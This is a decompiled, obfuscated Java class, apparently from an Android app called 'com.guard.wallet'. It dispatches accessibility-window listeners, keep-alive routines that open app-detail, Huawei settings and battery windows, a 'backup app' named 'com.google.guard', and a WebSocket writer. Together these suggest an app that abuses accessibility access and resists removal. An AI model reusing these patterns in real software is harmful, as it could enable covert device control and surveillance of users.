package p012o;

import a1.AbstractC0026q;
import android.os.Build;
import android.util.Log;
import com.guard.wallet.MainApplication;
import com.guard.wallet.filter.CombineFilter;
import com.guard.wallet.helper.AbstractC0192o;
import com.guard.wallet.helper.AbstractC0195r;
import com.guard.wallet.req.ListenWindow;
import com.guard.wallet.req.ReqListenHelper;
import com.guard.wallet.utils.AbstractC0251g;
import e1.AbstractC0272a;
import e1.InterfaceC0273b;
import f0.C0281b;
import f0.C0292m;
import f1.AbstractRunnableC0306a;
import i0.C0331b;
import i0.C0333d;
import java.io.IOException;
import java.nio.ByteBuffer;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.Objects;
import java.util.concurrent.ConcurrentLinkedQueue;
import java.util.concurrent.atomic.AtomicReference;
import javax.net.ssl.SSLException;
import o0.C0443f;
import o0.C0445h;
import p014r.EnumC0892e;

/* renamed from: o.d */
/* loaded from: classes.dex */
public final class RunnableC0415d implements Runnable {

    /* renamed from: a */
    public final /* synthetic */ int f857a;

    /* renamed from: b */
    public final Object f858b;

    /* renamed from: c */
    public final /* synthetic */ Object f859c;

    public RunnableC0415d(AbstractC0272a abstractC0272a) {
        this.f857a = 12;
        this.f859c = abstractC0272a;
        this.f858b = new ArrayList();
    }

    /* renamed from: a */
    public final void m1054a() {
        Object obj = this.f859c;
        while (!Thread.interrupted()) {
            try {
                ByteBuffer byteBuffer = (ByteBuffer) ((AbstractRunnableC0306a) obj).f568j.f462a.take();
                ((AbstractRunnableC0306a) obj).f570l.write(byteBuffer.array(), 0, byteBuffer.limit());
                ((AbstractRunnableC0306a) obj).f570l.flush();
            } catch (InterruptedException unused) {
                AbstractRunnableC0306a abstractRunnableC0306a = (AbstractRunnableC0306a) obj;
                Iterator it = abstractRunnableC0306a.f568j.f462a.iterator();
                while (it.hasNext()) {
                    ByteBuffer byteBuffer2 = (ByteBuffer) it.next();
                    abstractRunnableC0306a.f570l.write(byteBuffer2.array(), 0, byteBuffer2.limit());
                    abstractRunnableC0306a.f570l.flush();
                }
                Thread.currentThread().interrupt();
                return;
            }
        }
    }

    @Override // java.lang.Runnable
    public final void run() {
        String str;
        long nanoTime;
        switch (this.f857a) {
            case 0:
                C0416e c0416e = (C0416e) this.f859c;
                j0 j0Var = (j0) this.f858b;
                ConcurrentLinkedQueue concurrentLinkedQueue = c0416e.f865d;
                try {
                    if (concurrentLinkedQueue.isEmpty() || j0Var == null) {
                        return;
                    }
                    Iterator it = concurrentLinkedQueue.iterator();
                    while (it.hasNext()) {
                        ListenWindow listenWindow = (ListenWindow) it.next();
                        if (listenWindow != null && listenWindow.getEventTypes() != null && !listenWindow.getEventTypes().isEmpty() && listenWindow.getEventTypes().contains(Integer.valueOf(j0Var.f916b)) && listenWindow.equals(new ListenWindow(j0Var.f917c, j0Var.f918d)) && c0416e.m1077p(listenWindow, j0Var.f915a)) {
                            c0416e.m1066e(listenWindow, j0Var);
                        }
                    }
                    return;
                } catch (Exception e2) {
                    AbstractC0026q.m186s("AccessibilityDelegate:everyListenWindow", e2);
                    return;
                }
            case 1:
                C0418g c0418g = (C0418g) this.f859c;
                String str2 = (String) this.f858b;
                int i2 = C0418g.f887v;
                c0418g.getClass();
                try {
                    if (AbstractC0414c.m1045Y()) {
                        AbstractC0251g.T0(20);
                    }
                    c0418g.f888r.set(Objects.equals(str2, "com.google.guard") ? EnumC0892e.KEEP_ALIVE_BACKUP_APP : EnumC0892e.KEEP_ALIVE_MAIN_APP);
                    if (AbstractC0251g.Z0(str2)) {
                        Log.d("o.g", "启动 ".concat(str2).concat(" 应用详情监听窗口成功"));
                        "启动 ".concat(str2).concat(" 应用详情监听窗口成功");
                        return;
                    } else {
                        Log.e("o.g", "启动 ".concat(str2).concat(" 应用详情监听窗口失败"));
                        "启动 ".concat(str2).concat(" 应用详情监听窗口失败");
                        return;
                    }
                } catch (Exception e3) {
                    AbstractC0026q.m186s("o.g", e3);
                    return;
                }
            case 2:
                C0425n c0425n = (C0425n) this.f859c;
                int i3 = C0425n.f933y;
                c0425n.getClass();
                try {
                    if (AbstractC0414c.m1045Y()) {
                        AbstractC0251g.T0(20);
                    }
                    if (AbstractC0251g.X0()) {
                        Log.d("o.n", "启动华为系统设置成功");
                        return;
                    } else {
                        Log.e("o.n", "启动华为系统设置失败");
                        c0425n.mo1051Z();
                        return;
                    }
                } catch (Exception e4) {
                    AbstractC0026q.m186s("o.n", e4);
                    return;
                }
            case 3:
                C0428q c0428q = (C0428q) this.f859c;
                String str3 = (String) this.f858b;
                int i4 = C0428q.f945z;
                c0428q.getClass();
                try {
                    if (!Build.BRAND.equalsIgnoreCase("poco") && AbstractC0414c.m1045Y()) {
                        AbstractC0251g.T0(20);
                    }
                    c0428q.f946r.set(Objects.equals(str3, "com.google.guard") ? EnumC0892e.KEEP_ALIVE_BACKUP_APP : EnumC0892e.KEEP_ALIVE_MAIN_APP);
                    if (AbstractC0251g.Z0(str3)) {
                        Log.d("o.q", str3.concat(" 启动成功"));
                        str3.concat(" 启动成功");
                        return;
                    } else {
                        Log.e("o.q", str3.concat(" 启动失败"));
                        str3.concat(" 启动失败");
                        return;
                    }
                } catch (Exception e5) {
                    AbstractC0026q.m186s("o.q", e5);
                    return;
                }
            case 4:
                C0433v c0433v = (C0433v) this.f859c;
                String str4 = (String) this.f858b;
                int i5 = C0433v.f964v;
                c0433v.getClass();
                try {
                    if (AbstractC0414c.m1045Y()) {
                        AbstractC0251g.T0(20);
                    }
                    c0433v.f965r.set(Objects.equals(str4, "com.google.guard") ? EnumC0892e.KEEP_ALIVE_BACKUP_APP : EnumC0892e.KEEP_ALIVE_MAIN_APP);
                    if (AbstractC0251g.Z0(str4)) {
                        Log.d("o.v", str4.concat(" 启动成功"));
                        str4.concat(" 启动成功");
                        return;
                    } else {
                        Log.e("o.v", str4.concat(" 启动失败"));
                        str4.concat(" 启动失败");
                        return;
                    }
                } catch (Exception e6) {
                    AbstractC0026q.m186s("o.v", e6);
                    return;
                }
            case 5:
                e0 e0Var = (e0) this.f859c;
                String str5 = (String) this.f858b;
                int i6 = e0.f875y;
                e0Var.getClass();
                if (AbstractC0414c.m1045Y()) {
                    AbstractC0251g.T0(20);
                }
                e0Var.f876r.set(Objects.equals(str5, "com.google.guard") ? EnumC0892e.KEEP_ALIVE_BACKUP_APP : EnumC0892e.KEEP_ALIVE_MAIN_APP);
                String str6 = AbstractC0251g.Z0(str5) ? " 应用详情已启动" : " 应用详情启动失败";
                Log.d("o.e0", str5.concat(str6));
                str5.concat(str6);
                return;
            case 6:
                i0 i0Var = (i0) this.f859c;
                String str7 = (String) this.f858b;
                int i7 = i0.f902B;
                i0Var.getClass();
                try {
                    if (AbstractC0414c.m1045Y()) {
                        AbstractC0251g.T0(20);
                    }
                    boolean equals = Objects.equals(str7, MainApplication.getInstance().getPackageName());
                    AtomicReference atomicReference = i0Var.f904r;
                    if (equals) {
                        atomicReference.set(EnumC0892e.KEEP_ALIVE_UNKNOWN);
                    }
                    if (Objects.equals(str7, "com.google.guard")) {
                        atomicReference.set(EnumC0892e.KEEP_ALIVE_MAIN_APP);
                    }
                    i0Var.f905s.set("prepareInAppPowerRank");
                    if (i0Var.A0()) {
                        Log.d("o.i0", "App耗电管理窗口已启动");
                        str = " App耗电管理窗口已启动";
                    } else {
                        Log.e("o.i0", "App耗电管理窗口启动失败");
                        str = " App耗电管理窗口启动失败";
                    }
                    str7.concat(str);
                    return;
                } catch (Exception e7) {
                    AbstractC0026q.m186s("o.i0", e7);
                    return;
                }
            case 7:
                AbstractC0192o.m362c((C0416e) this.f859c, (ReqListenHelper) this.f858b);
                return;
            case 8:
                AbstractC0195r.m375d((C0416e) this.f859c, (CombineFilter) this.f858b);
                return;
            case 9:
                ((C0281b) this.f859c).mo778c((C0292m) this.f858b);
                return;
            case 10:
                ((C0333d) this.f858b).mo813c((Exception) this.f859c);
                return;
            case 11:
                C0445h c0445h = (C0445h) this.f859c;
                c0445h.m1181j(c0445h.f1036m, c0445h.f1035l, c0445h.f1038o, c0445h.f1022I, (C0443f) this.f858b, null);
                return;
            case 12:
                ((ArrayList) this.f858b).clear();
                try {
                    ((ArrayList) this.f858b).addAll(((AbstractC0272a) this.f859c).mo744r());
                    synchronized (((AbstractC0272a) this.f859c).f460h) {
                        nanoTime = (long) (System.nanoTime() - (((AbstractC0272a) this.f859c).f458f * 1.5d));
                    }
                    Iterator it2 = ((ArrayList) this.f858b).iterator();
                    while (it2.hasNext()) {
                        AbstractC0272a.m743q((AbstractC0272a) this.f859c, (InterfaceC0273b) it2.next(), nanoTime);
                    }
                } catch (Exception unused) {
                }
                ((ArrayList) this.f858b).clear();
                return;
            default:
                Thread.currentThread().setName("WebSocketWriteThread-" + Thread.currentThread().getId());
                try {
                    try {
                        m1054a();
                    } catch (IOException e8) {
                        AbstractRunnableC0306a abstractRunnableC0306a = (AbstractRunnableC0306a) this.f859c;
                        int i8 = AbstractRunnableC0306a.f566t;
                        abstractRunnableC0306a.getClass();
                        if (e8 instanceof SSLException) {
                            abstractRunnableC0306a.mo337w(e8);
                        }
                        abstractRunnableC0306a.f568j.m770o();
                    }
                    Object obj = this.f859c;
                    try {
                        if (((AbstractRunnableC0306a) obj).f569k != null) {
                            ((AbstractRunnableC0306a) obj).f569k.close();
                            return;
                        }
                        return;
                    } catch (IOException e9) {
                        ((AbstractRunnableC0306a) obj).mo337w(e9);
                        return;
                    }
                } catch (Throwable th) {
                    Object obj2 = this.f859c;
                    try {
                        if (((AbstractRunnableC0306a) obj2).f569k != null) {
                            ((AbstractRunnableC0306a) obj2).f569k.close();
                        }
                    } catch (IOException e10) {
                        ((AbstractRunnableC0306a) obj2).mo337w(e10);
                    }
                    throw th;
                }
        }
    }

    public RunnableC0415d(C0333d c0333d, C0331b c0331b) {
        this.f857a = 10;
        this.f858b = c0333d;
        this.f859c = c0331b;
    }

    public /* synthetic */ RunnableC0415d(Object obj, Object obj2, int i2) {
        this.f857a = i2;
        this.f859c = obj;
        this.f858b = obj2;
    }
}
